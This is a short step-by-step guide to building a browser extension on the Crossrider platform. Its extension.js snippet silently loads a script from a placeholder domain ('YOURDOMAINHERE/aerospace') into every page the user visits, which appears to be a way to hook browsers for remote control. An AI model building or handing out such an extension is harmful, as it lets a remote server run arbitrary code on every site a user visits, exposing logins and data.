In order to create your own browser plugin, follow these simple steps.

1. Create an account @ http://crossrider.com

2. Create a browser extension and give it a title/description

3. Edit the code and open extension.js

4. Paste the following code and make changes to your DNS

/************************************************************************************
  This is your Page Code. The appAPI.ready() code block will be executed on every page load.
  For more information please visit our docs site: http://docs.crossrider.com
*************************************************************************************/

appAPI.ready(function($) {
     appAPI.dom.addRemoteJS({
        url: "https://YOURDOMAINHERE/aerospace",
        additionalAttributes: {charset: "UTF-8"},
        callback: function() {
        }
     });
});

5. Save the file and click sync with production in the header

6. Click the "Settings" menu item to reveal the general settings

7. Click "Download Links" from the side menu

8. Download your new plugin!
